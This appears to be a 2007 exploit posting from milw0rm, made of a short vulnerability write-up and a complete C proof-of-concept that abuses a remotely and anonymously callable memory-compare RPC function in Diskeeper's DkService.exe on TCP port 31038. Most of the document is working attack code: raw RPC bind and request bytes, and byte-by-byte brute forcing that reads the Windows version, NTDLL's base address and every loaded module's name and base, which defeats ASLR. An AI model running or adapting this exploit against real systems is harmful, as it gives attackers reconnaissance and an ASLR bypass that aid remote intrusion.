/*
Diskeeper Remote Memory Disclosure
Credit: Pravus (pravus -a-t- hush -d-o-t- com)
Greetz: Scientology for making a remotely accessible disk
defragmenter.  Felix, Jenna, and Isaac.

Vulnerability Description:
This vulnerability involves a memory comparison function that is
remotely, anonymously accessible via the remote procedure call in
the Diskeeper administrative interface.  Using this, an attacker
can guess / brute force memory at any address in the process;
although passing a bad pointer will cause a memory read exception
and DoS the process.  Since causing a Denial of Service for
Diskeeper is of minimal consequence, this write-up will focus on
the memory reading aspect.

By making use of shared user memory at 0x7FFE0000, an attacker can
learn information, such as Windows drive, path, and version.  More
importantly for a targeted attack, an attacker can also get the
name, path, version and base address of all loaded modules in the
process. This would essentially defeat address space randomization
(ASLR) in Windows Vista, since loaded modules tend to have the same
preferred address in all processes for each boot of the system.

Details:
Diskeeper introduced their administrative interface in Diskeeper 9
and continued it in Diskeeper 10 and Diskeeper 2007.  For the
purpose of this vulnerability I tested in Diskeeper 9 Professional
and Diskeeper 2007 Pro Premier.  (Though I believe from
documentation that the Server Editions of each and both versions in
Diskeeper 10 are equally vulnerable.)

The administrative interface, DkService.exe, runs as a system
service that is by default configured to automatically start.  It
listens on TCP port 31038 and has three RPC functions available.
Calling the opcode 0x01 RPC function (MIDL below) allows a remote,
anonymous memory comparison at an attacker provided address.
Simply pass the size of the data, the data, and the address to make
use of this.

MIDL
/* opcode: 0x01, address: 0x004922F0 (address from 2007
ProPremier)* /

long  sub_4922F0 (
 [in] long arg_1,
 [in][size_is(arg_1)] char * arg_2,
 [in] hyper arg_3
);


Exploitation:
In order to exploit this, one must bind to the RPC interface, then
initiate the RPC call as many times as desired.   If guessing an
intelligent value, such as a widecharacter string L"WINDOWS",
providing multiple bytes of data is optimal for speed's sake.  If
attempting to brute force an address, doing so one byte at a time
is preferable so you are guessing at most 4n times instead of n^4.

In my sample exploit, I am first getting general system information
by looking at fixed locations in shared user data.  I get the
Windows drive letter, the Windows directory, and the Windows OS
version (5.1=XP; 6.0=Vista; etc.)  Then I brute force an address in
NTDLL.DLL from the shared user data.  From this, I can jump
backwards to the start of the module, looking for the MZ header.
Knowing where the start of the module is, I can look for the .data
header to find where the data section of NTDLL.DLL is loaded.

This is where things get a little tricky.  Since the loaded module
hash table is at different places in the data section depending on
the version of NTDLL.DLL, we have to search for it.  Basically each
hash bucket that is empty contains a pointer to itself, so I made a
mask to place over memory that defined which buckets could be empty
vs. not, and defined that the last 6 had to be empty, because they
correspond to modules that don't start with an alphabetic character
in name.  (This part could be made more effective and faster, but
for a PoC, it should work.)  Once it finds memory that fits the
mask, I iterate the linked list at each of the 32 hash buckets and
read the relevant loaded module information.

I just used a #define for the IP address string, so modify it for
your target IP.

Exploit Code:

*/

//Diskeeper Remote Memory Read
//By: Pravus
#define WIN32_LEAN_AND_MEAN
#define PORT 31038
#define DELAY 50
#define _CRT_SECURE_NO_DEPRECATE
#define _USE_32BIT_TIME_T
#define servername "127.0.0.1"

#pragma comment (lib,"ws2_32")
#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/timeb.h>
#include <time.h>

char rpcbind [] =
"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x00\x00\x00\x00"
"\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
"\xb7\xf9\x09\x28\xef\xcf\x64\x41\x8c\x46\xe8\xd4\x17\x52\x2c\x1c"
"\x03\x00\x03\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
"\x2b\x10\x48\x60\x02\x00\x00\x00";

char request [] =
"\x05\x00\x00\x03\x10\x00\x00\x00\x68\x00\x00\x00\x00\x00\x00\x00"
"\x50\x00\x00\x00\x00\x00\x01\x00";
//4 byte len
//4 byte len
//dword aligned string
//pointer
//ign dword


//This function is a simple remote comparison returning true if the memory
//at loc matches value for len bytes.  This is where the real "exploitation"
//comes into play.  We just send a mocked up RPC request using their provided
//remote mem compare function.
BOOL rmemcmp(SOCKET conn, int loc, char* value, int len)
{
               char buff [32768];
               int w,x=0;
               memset(buff, '\0', sizeof(buff));
               memcpy(buff, request, sizeof(request));
               x+=sizeof(request)-1;

               memcpy(buff+x, &len, sizeof(len));  //len
               x+=sizeof(len);
               memcpy(buff+x, &len, sizeof(len));  //len
               x+=sizeof(len);
               memcpy(buff+x, value, len); //string
               x+=len;
               x+=(8-(len%8))%8;  //null pad
               memcpy(buff+x, &loc, sizeof(loc));  //pointer
               x+=sizeof(loc);
               w=0;
               memcpy(buff+x, &w, sizeof(w));  //don't care
               x+=sizeof(w);

               w=x-0x18;
               memcpy(buff+8, &x, sizeof(x));
               memcpy(buff+0x10, &w, sizeof(w));

               send(conn,(const char*)buff,x,0);
               recv(conn,(char*)buff,2048,0);

               w=*(buff+0x18);
               return (BOOL)w;
}

//main function do all the calls
int main(int argc, char** argv)
{
       WSADATA wsaData;
       if (WSAStartup(0x202,&wsaData))
               return 1;

       SOCKET conn;
       conn=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
       if(conn==INVALID_SOCKET)
           return 1;

       unsigned long addr;
       addr=inet_addr(servername);
       if (addr==INADDR_NONE)
       {
               closesocket(conn);
               return 1;
       }

       sockaddr_in server;
       server.sin_addr.s_addr=addr;
       server.sin_family=AF_INET;
       server.sin_port=htons(PORT);
       if(connect(conn,(struct sockaddr*)&server,sizeof(server)))
       {
               closesocket(conn);
               return 1;
       }

       linger ling;
       ling.l_onoff=1;
       ling.l_linger=0;
       char buff [32768];
       char str [1024];
       WCHAR wstr [1024];
       unsigned char filechars [] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.\\";
       unsigned int listbin, mask;
       unsigned char c, *d;
       int u,v,w,x,y,z,ret,ntbase,ntdata,modbase;
       struct _timeb timebuffer;

       timeval t;
       t.tv_sec=0;
       t.tv_usec=DELAY;

       //send the rpc bind
       send(conn,(const char*)rpcbind,sizeof(rpcbind)-1,0);
       recv(conn,(char*)buff,2048,0);

       //get the Windows drive letter
       ret=0;
       c='A';
       y=1;
       z=0x7FFE0030;
       while ((ret==0) && (c<='Z'))
       {
               sprintf(str, "%c", c);
               ret=rmemcmp(conn, z, str, y);

               c++;
       }

       if (!ret)
       {
               printf("Could not determine drive letter.\n");
       }
       else
       {
               c--;
               printf("Windows running on drive %c\n",c);
       }

       //get the Windows dir
       z=0x7FFE0036;
       wcscpy(wstr, L"WINDOWS");
       y=wcslen(wstr)*2;
       if (rmemcmp(conn, z, (char*)wstr, y))
       {
               printf("Windows directory is WINDOWS\n");
       }
       else
       {
               wcscpy(wstr, L"WINNT");
               y=wcslen(wstr)*2;
               if (rmemcmp(conn, z, (char*)wstr, y))
               {
                       printf("Windows directory is WINNT\n");
               }
               else
               {
                               ret=0;
                               y=1;
                               z=0x7FFE0036;
                               printf("Windows directory is ");
                               do {
                                       d=filechars;
                                       ret=0;
                                       while ((ret==0) && (*d))
                                       {
                                               sprintf(str, "%c", *d);
                                               ret=rmemcmp(conn, z, str, y);

                                               d++;
                                       }
                                       if (ret)
                                               printf(str);
                                       z+=2;
                               } while (ret==1);
                               printf("\n");
               }
       }

       //Windows version
       printf("Windows version is ");

       ret=0;
       c='\x00';
       y=1;
       z=0x7FFE026C;
       while (ret==0)
       {
               sprintf(str, "%c", c);
               ret=rmemcmp(conn, z, str, y);

               c++;
       }
       c--;
       printf("%u.",c);

       ret=0;
       c='\x00';
       y=1;
       z+=4;
       while (ret==0)
       {
               sprintf(str, "%c", c);
               ret=rmemcmp(conn, z, str, y);

               c++;
       }
       c--;
       printf("%u\n",c);

       //find the NTDLL.DLL base address
       x=0;
       y=1;
       for (z=0x7FFE0303; z>=0x7FFE0300; z--)
       {
               ret=0;
               c='\x00';
               while (ret==0)
               {
                       sprintf(str, "%c", c);
                       ret=rmemcmp(conn, z, str, y);

                       c++;
               }
               c--;
               x=x<<8;
               x+=c;
       } //      printf ("Beginning search for NTDLL.DLL at 0x%x\n",x);

       z=x&0xFFFF0000;
       strcpy(str, "MZ");
       y=2;
       ret=0;
       while (ret==0)
       {
                       ret=rmemcmp(conn, z, str, y);
                       z-=0x10000;
       }
       z+=0x10000;
       ntbase=z;
       printf ("NTDLL.DLL is based at 0x%x\n",z);

       //Look for .data section and then the module hash table in NTDLL (LDR_MODULE)
       z+=0x160;  //to skip over some of DOS header + PE header + .text section

       strcpy(str, ".data");
       y=5;
       ret=0;
       while (ret==0)
       {
                       ret=rmemcmp(conn, z, str, y);
                       z+=4;
       }
       z+=8;  //start of .data + 0x0c
       y=1;
       x=0;
       for (w=z+3; w>=z; w--)
       {
               ret=0;
               c='\x00';
               while (ret==0)
               {
                       sprintf(str, "%c", c);
                       ret=rmemcmp(conn, w, str, y);

                       c++;
               }
               c--;
               x=x<<8;
               x+=c;
       }
       z=ntdata=x+ntbase;
       printf ("NTDLL data section located at 0x%x\n",z);

       //mask - 0=can't be empty hash, 1=can be empty; 01001101 11010000 10000101 11111111
       mask=0x4DD085FF;
       listbin=0;
       y=4;
       do
       {
               ret=rmemcmp(conn, z, (char*)&z, y);
               listbin=(listbin<<1)+ret;
               ret=rmemcmp(conn, z+4, (char*)&z, y);
               listbin=listbin&(~(!ret));

               z+=8;
       } while ((z<ntdata+256)||((listbin&mask)!=listbin)||((listbin&0x3F)!=0x3F));
       //note - if this isn't working, may need to tweak the last while clause...
       //if a DLL were being loaded/injected that didn't start with an alpha character,
       //these buckets wouldn't be empty

       modbase=z-256;
       printf("Found loaded modules list at 0x%x\n",modbase);

	   _ftime( &timebuffer );
       //lets get the modules
       for (z=modbase;z<modbase+256;z+=8)
       {
               if (((listbin>>(31-((z-modbase)/8)))&1)==0)
               {
                       v=z;
                       do {
                               x=0;
                               y=1;
                               for (w=v+3; w>=v; w--)
                               {
                                       ret=0;
                                       c='\x00';
                                       while (ret==0)
                                       {
                                               sprintf(str, "%c", c);
                                               ret=rmemcmp(conn, w, str, y);

                                               c++;
                                       }
                                       c--;
                                       x=x<<8;
                                       x+=c;
                               }

                               if (x==z)  //if the next pointer points back to the module list, we're done
                                       break;

                               //get address of module name
                               v=x-12;
                               u=0;
                               y=1;
                               for (w=v+3; w>=v; w--)
                               {
                                       ret=0;
                                       c='\x00';
                                       while (ret==0)
                                       {
                                               sprintf(str, "%c", c);
                                               ret=rmemcmp(conn, w, str, y);

                                               c++;
                                       }
                                       c--;
                                       u=u<<8;
                                       u+=c;
                               }

                               //get the module name
                               ret=0;
                               y=1;
                               printf("Module ");
                               do {
                                       d=filechars;
                                       ret=0;
                                       while ((ret==0) && (*d))
                                       {
                                               sprintf(str, "%c", *d);
                                               ret=rmemcmp(conn, u, str, y);

                                               d++;
                                       }
                                       if (ret)
                                               printf(str);
                                       u+=2;
                               } while (ret==1);
                               printf(" is loaded at ");

                               //get the module address
                               v=x-36;
                               u=0;
                               y=1;
                               for (w=v+3; w>=v; w--)
                               {
                                       ret=0;
                                       c='\x00';
                                       while (ret==0)
                                       {
                                               sprintf(str, "%c", c);
                                               ret=rmemcmp(conn, w, str, y);

                                               c++;
                                       }
                                       c--;
                                       u=u<<8;
                                       u+=c;
                               }
                               printf("0x%x\n",u);

                               //get the module timestamp
                               v=x+8;
                               u=0;
                               y=1;
                               for (w=v+3; w>=v; w--)
                               {
                                       ret=0;
                                       c='\x00';
                                       while (ret==0)
                                       {
                                               sprintf(str, "%c", c);
                                               ret=rmemcmp(conn, w, str, y);

                                               c++;
                                       }
                                       c--;
                                       u=u<<8;
                                       u+=c;
                               }
                               memset(str, '\0', sizeof(str));
                               timebuffer.time=u;
                               ctime_s(str, 26, &(timebuffer.time));
                               printf("Module time is %.24s (0x%x)\n", str, u);

                               v=x;
                       } while (v!=z);
               }
       }

       system("pause");

       WSACleanup();
       return 0;
}

// milw0rm.com [2007-08-17]
